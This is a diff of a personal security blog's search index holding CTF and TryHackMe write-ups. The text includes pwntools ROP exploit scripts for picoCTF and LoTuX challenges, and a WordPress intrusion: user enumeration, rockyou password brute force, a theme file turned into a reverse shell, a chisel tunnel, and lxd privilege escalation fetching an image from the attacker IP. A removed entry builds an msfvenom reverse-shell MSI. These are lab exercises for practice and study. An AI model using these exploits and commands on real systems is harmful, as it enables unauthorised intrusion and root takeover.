+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./ropfu&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">52033</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">data=(<span class="number">0x080e36a0</span>+<span class="number">0x080e6ff0</span>)//<span class="number">2</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80b073a</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x8049022</span></span><br><span class="line">pop_ecx_ret=<span class="number">0x8049e29</span></span><br><span class="line">pop_edx_ebx_ret=<span class="number">0x80583b9</span></span><br><span class="line">syscall=<span class="number">0x806417d</span></span><br><span class="line">mov_edx_eax=<span class="number">0x080590f2</span></span><br><span class="line">get=<span class="number">0x08051b60</span></span><br><span class="line">read=<span class="number">0x0806ece0</span></span><br><span class="line">vuln=<span class="number">0x08049d85</span></span><br><span class="line"><span class="built_in">bin</span>=<span class="number">0x6e69622f</span></span><br><span class="line">sh=<span class="number">0x0068732f</span></span><br><span class="line">int80=<span class="number">0x0807163f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+flat(pop_eax_ret, <span class="built_in">bin</span>, pop_edx_ebx_ret, data, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, sh, pop_edx_ebx_ret, data+<span class="number">4</span>, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>ROP</tag>
+        <tag>pwn</tag>
+        <tag>Stack Migration</tag>
+        <tag>x86_64</tag>
+        <tag>x86</tag>
       </tags>
   </entry>
   <entry>
@@ -2033,6 +2111,53 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>For Business Reasons on Tryhackme</title>
+    <url>/2024/06/02/thm-for-business-reasons/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>今天寫的詳細點，當作替攻防演練練習(?)<br>Victim’s IP : 10.10.130.147<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p>使用 rustscan 進行端口掃描  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.130.147 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/H1xnVat4C.png" alt="image">  </p>
+<p>只有一個 80 port，進去是 wordpress</p>
+<h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>利用wpscan對網站進行掃描與用戶枚舉  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -e u</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyrGr6K4A.png" alt="image">  </p>
+<p>上網查一下可以知道這個版本仍然能登入後RCE。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="password-enumeration"><a href="#password-enumeration" class="headerlink" title="password enumeration"></a>password enumeration</h4><p>再次利用wpscan搭配rockyou.txt結合前面獲得的使用者名稱(<code>sysadmin</code>)進行帳號密碼爆破  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -P /home/wha13/wordlists/rockyou.txt -U sysadmin</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rytvHpKER.png" alt="image">  </p>
+<p>成功取得帳號密碼，到<code>http://10.10.130.147/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyseventeen</code>編輯404.php改成reverse shell(彈到 port 9001)<br>本地開啟9001端口  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 9001</span><br></pre></td></tr></table></figure>
+<p>最後造訪<code>http://10.10.130.147/wp-content/themes/twentyseventeen/404.php</code>就拿到shellㄌ  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h4><p>透過本地http server打routingtableparser進去(rtp)看有哪些網路介面<br><a href="https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0">link : https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0</a><br>看到這個有趣的eth2，port scan下去<br><img src="https://hackmd.io/_uploads/rJudI6FNC.png" alt="image">  </p>
+<p><strong>portscan.sh</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the script is provided with exactly one argument</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;IP&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">IP=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span> (<span class="built_in">echo</span> Hello &gt; /dev/tcp/<span class="variable">$IP</span>/<span class="variable">$port</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Port <span class="variable">$port</span> is OPEN&quot;</span>) 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>啟動它：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./portscan.sh 172.18.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/By4xv6KN0.png" alt="image">  </p>
+<p>發現port 22，利用chisel<a href="https://github.com/jpillora/chisel">(link here)</a>把ssh串出來：  </p>
+<p>攻擊者端：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chisel server -p 8000 --reverse -v</span><br></pre></td></tr></table></figure>
+<p>Victim端：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">./chisel client 10.9.195.189:8000 R:127.0.0.1::2222:172.18.0.1:22</span><br></pre></td></tr></table></figure>
+<p>最後ssh進去，密碼跟剛剛一樣：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh sysadmin@0.0.0.0 -p 2222</span><br></pre></td></tr></table></figure>
+<h4 id="lxd-exploit"><a href="#lxd-exploit" class="headerlink" title="lxd exploit"></a>lxd exploit</h4><p>Linpeas進去看到lxd權限有開<br><img src="https://hackmd.io/_uploads/BkBldptVC.png" alt="image"><br>開打 :D<br><a href="https://github.com/samoN1k0la/LXD-Privilege-Escalation">Reference : samoN1k0la@github</a><br>攻擊者端(需要root權限)：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJZnupKVR.png" alt="image"><br>開 http server  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7777</span><br></pre></td></tr></table></figure>
+<p><strong>Victim 端</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 10.9.195.189:7777/alpine-v3.20-x86_64-20240602_1718.tar.gz</span><br><span class="line">lxc image import alpine-v3.20-x86_64-20240602_1718.tar.gz --<span class="built_in">alias</span> thesysrat</span><br><span class="line">lxc image list</span><br><span class="line">lxc init thesysrat ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>
+<p>整個機器就被送進去 <code>/mnt/root</code> 的路徑咯~<br><img src="https://hackmd.io/_uploads/H1wzYpYNC.png" alt="image"><br>hehe  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>好欸又一台 Hard，練了很多技巧<br>不過建議某人不要耍白目了👊  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>lxd</tag>
+        <tag>routingtableparser</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VulnNet:Roasted on Tryhackme</title>
     <url>/2024/03/05/vulnet-rst/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>第二次打AD，好玩ww  </p>
@@ -2075,53 +2200,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Return Oriented Program note</title>
-    <url>/2023/10/29/rop1/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
-<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h3><p>ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).<br>Basically, a fragment end with <code>ret</code> is mostly used.  </p>
-<h3 id="x86-64-ROP"><a href="#x86-64-ROP" class="headerlink" title="x86_64 ROP"></a>x86_64 ROP</h3><p>In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx ……<br>To connect the ROP Chain, it’s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as <code>ROPgadget</code>  and <code>pwntool</code>.<br><strong>ROPgadget:</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary=binary_file | grep &quot;mov dword .* ret&quot; | less</span><br></pre></td></tr></table></figure>
-<p>In this command, I want to find a gadget start with mov_dword and end with ret.<br>but is much more easier to find a register fragment with pwntool.<br><strong>pwntool</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./oob1&#x27;</span>)</span><br><span class="line"><span class="comment"># find an rdi fregment</span></span><br><span class="line">rop.rdi</span><br><span class="line"><span class="comment"># result</span></span><br><span class="line"><span class="comment"># Gadget(0x400a03, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span></span><br></pre></td></tr></table></figure>
-<p>In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
-<p><a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a><br>syscall table has each register need for every call and the meaning for each register.<br>p.s. execve is excution call.<br>Connect fragment like <code>pop rdi; ret</code> with a value can modify the value of <code>rdi</code> and move to mext fregment(possibly a function or syscall)<br>An example for an excution syscall:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, shellcode, pop_rsi_ret, <span class="number">0</span>, syscall)</span><br></pre></td></tr></table></figure>
-<p>This ROP chain would make the value of rax become <code>0x3b</code>(execve on <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>), and rdi value become the address of shellcode(like string: <code>/bin/sh\x00</code>)<br><code>\x00</code> is a symbol to stop reading.<br>Also, vmmap in geb-peda is often used to find writable(or something else) datas.  </p>
-<h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>Same logic as <code>x86_64</code><br><a href="https://syscalls.w3challs.com/?arch=x86">syscall table</a><br>Some differents between x86 and x86_64:  </p>
-<ol>
-<li>In x86 system, each address and register are mostly 4 bytes  </li>
-<li>int80 in x86 has the same function with syscall in x86_64<br><strong>Example:</strong><br>execve in x86:  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Pwnasm-from-LoTuX-CTF"><a href="#Pwnasm-from-LoTuX-CTF" class="headerlink" title="Pwnasm from LoTuX CTF"></a>Pwnasm from LoTuX CTF</h3><p><a href="https://lotuxctf.com/challenges#Pwnasm-27">Click link</a><br>It’s a simple ROP<br><strong>Solution</strong><br>Start with pwntool:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./pwnasm&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>Extracted datas:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-<p>It’s a x86_64 system(amd64), so check out the <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a> ,register gadgets needed to trigger <code>syscall</code> are <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>.<br>Also, from the reverse result by <a href="https://ghidra-sre.org/">Ghidra</a><img src="https://hackmd.io/_uploads/ByWE-tiMa.png"><br>there are some weird datas on the stack(our shell(<code>&#39;/bin/sh&#39;</code> at<code>0x00402000</code>) and first part of flag), so it’s possible to construct an ROP Chain and excuse the shell  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.rax</span><br><span class="line">rop.rdi</span><br><span class="line">rop.rsi</span><br><span class="line">rop.rdx</span><br><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
-<p>Extracted datas:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; rop.rax</span><br><span class="line">Gadget(0x401000, [&#x27;pop rax&#x27;, &#x27;ret&#x27;], [&#x27;rax&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdx</span><br><span class="line">Gadget(0x401006, [&#x27;pop rdx&#x27;, &#x27;ret&#x27;], [&#x27;rdx&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdi</span><br><span class="line">Gadget(0x401002, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rsi</span><br><span class="line">Gadget(0x401004, [&#x27;pop rsi&#x27;, &#x27;ret&#x27;], [&#x27;rsi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.syscall</span><br><span class="line">gadget(address=4198416, details=Gadget(0x401010, [&#x27;syscall&#x27;, &#x27;ret&#x27;], [], 0x4))</span><br></pre></td></tr></table></figure>
-<p>Finally, my exploit code:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;lotuxctf.com&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x402000</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401000</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401002</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401004</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401006</span></span><br><span class="line">syscall=<span class="number">0x401010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload=flat(pop_rax_ret, <span class="number">0x3b</span>, pop_rdi_ret, shell, pop_rsi_ret, <span class="number">0</span>, pop_rdx_ret, <span class="number">0</span>, syscall)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo server"></a>echo server</h3><p><a href="https://wha13.github.io/files/echo_server/echo_server">file</a><br><a href="https://wha13.github.io/files/echo_server/echo_server.c">source code</a><br>A x86_64 file<br>ROP Chain:<br><code>pop rdi; ret</code>-&gt;<code>change rdi location to global variable</code>-&gt;<code>trigger get function</code>-&gt;<code>return to runCMD function to bypass getString() filtering function</code><br>Exploit:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./echo_server&#x27;</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">runCMD=<span class="number">0x4006c6</span></span><br><span class="line">gets=<span class="number">0x4005a0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400923</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">r.recvlines(<span class="number">7</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="rop1-sean-Pwn-2"><a href="#rop1-sean-Pwn-2" class="headerlink" title="rop1-sean_Pwn-2"></a>rop1-sean_Pwn-2</h3><p><a href="https://wha13.github.io/files/rop1-sean_Pwn-2/rop1">file</a><br><a href="https://blog.frozenkp.me/pwn/stack_migration/">Stack Migration</a>  </p>
-<h4 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h4><p>Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if it’s a x86_64 system)&#x2F;first 4 bytes(if it’s a x86 system) need to be a location for new register(<del>garbage</del>)</p>
-<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>First write the ROP Chain into global variable, and trgger it in <code>func1</code>, remember to leave.</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=(<span class="number">0x006c9eb8</span>+<span class="number">0x006cd548</span>)//<span class="number">2</span></span><br><span class="line">pop_rax_rdx_rbx_ret=<span class="number">0x478616</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401516</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401637</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">read=<span class="number">0x43f4b0</span></span><br><span class="line">syscall=<span class="number">0x4003da</span></span><br><span class="line">func1=<span class="number">0x4009ae</span></span><br><span class="line">leave=<span class="number">0x4009e4</span></span><br><span class="line">main=<span class="number">0x4009e6</span></span><br><span class="line">bof2=<span class="number">0x6ccd60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=flat(<span class="number">1004120</span>, pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, bof2+<span class="number">10</span>*<span class="number">0x8</span>, pop_rsi_ret, <span class="number">0</span>, syscall, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;rahwhale&#x27;</span>*<span class="number">4</span>+flat(bof2, leave)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="ropfu-from-picoCTF"><a href="#ropfu-from-picoCTF" class="headerlink" title="ropfu from picoCTF"></a>ropfu from picoCTF</h3><p><a href="https://play.picoctf.org/practice/challenge/292?category=6&page=3">link</a><br>An <code>i386</code> (x86) system, key points are on above.<br>Use fragments like <code>mov dword [edx] eax; ret</code> to write shell on eax into location edx.<br>p.s.the shell input need to be converted into hex and reversed<br><strong>exploit</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./ropfu&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">52033</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">data=(<span class="number">0x080e36a0</span>+<span class="number">0x080e6ff0</span>)//<span class="number">2</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80b073a</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x8049022</span></span><br><span class="line">pop_ecx_ret=<span class="number">0x8049e29</span></span><br><span class="line">pop_edx_ebx_ret=<span class="number">0x80583b9</span></span><br><span class="line">syscall=<span class="number">0x806417d</span></span><br><span class="line">mov_edx_eax=<span class="number">0x080590f2</span></span><br><span class="line">get=<span class="number">0x08051b60</span></span><br><span class="line">read=<span class="number">0x0806ece0</span></span><br><span class="line">vuln=<span class="number">0x08049d85</span></span><br><span class="line"><span class="built_in">bin</span>=<span class="number">0x6e69622f</span></span><br><span class="line">sh=<span class="number">0x0068732f</span></span><br><span class="line">int80=<span class="number">0x0807163f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+flat(pop_eax_ret, <span class="built_in">bin</span>, pop_edx_ebx_ret, data, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, sh, pop_edx_ebx_ret, data+<span class="number">4</span>, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>ROP</tag>
-        <tag>pwn</tag>
-        <tag>Stack Migration</tag>
-        <tag>x86_64</tag>
-        <tag>x86</tag>
       </tags>
   </entry>
   <entry>
@@ -2238,37 +2316,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Web Security</tag>
         <tag>XSS</tag>
         <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cyberlens on Tryhackme</title>
-    <url>/2024/05/22/cyberlens-thm/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I haven’t posted any pentesting write up recently.<br>It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~<br>Victim’s IP : 10.10.231.218<br>Victim’s Host : cyberlens.thm<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.231.218 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-
-<p>Found out an interesting service on port 61777 (Apache Tika 1.17 Server)  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2018-1335"><a href="#CVE-2018-1335" class="headerlink" title="CVE-2018-1335"></a>CVE-2018-1335</h4><blockquote>
-<p>Exploiting Tika 1.17 server  </p>
-</blockquote>
-<p>After a quick searching on exploit-db, I tried this exploit on msfconsole, and gain a user shell.  </p>
-<p><img src="https://hackmd.io/_uploads/rknxMYoQC.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Exploiting-AlwaysInstallElevated"><a href="#Exploiting-AlwaysInstallElevated" class="headerlink" title="Exploiting AlwaysInstallElevated"></a>Exploiting AlwaysInstallElevated</h4><p>I used PrivescCheck.ps1 script to check PE Vectors on this machine.  </p>
-<p><img src="https://hackmd.io/_uploads/BkUBMti70.png" alt="image">  </p>
-<p>The AlwaysInstallElevated setting allows users to install msi file with admin’s privilege and run it with the same privilege, either.  </p>
-<p>So, just spawn a vicious msi file with msfvenom:  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.195.189  LPORT=9003 -a x64 --platform Windows -f msi -o evil.msi</span><br></pre></td></tr></table></figure>
-<p>Grep it with Victim’s machine and run ~<br><img src="https://hackmd.io/_uploads/SkyCGts70.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkSeXtoXR.png" alt="image">  </p>
-<p>Aha !</p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>My first pentesting on my New Ubuntu VM &gt;w&lt;  </p>
-<p><img src="https://github.com/William957-web/Daily/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-05-22%20223020.png?raw=true" alt="image">  </p>
-<p><strong>References</strong><br><a href="https://juggernaut-sec.com/alwaysinstallelevated/">https://juggernaut-sec.com/alwaysinstallelevated/</a>  </p>
-]]></content>
-      <tags>
-        <tag>Windows</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
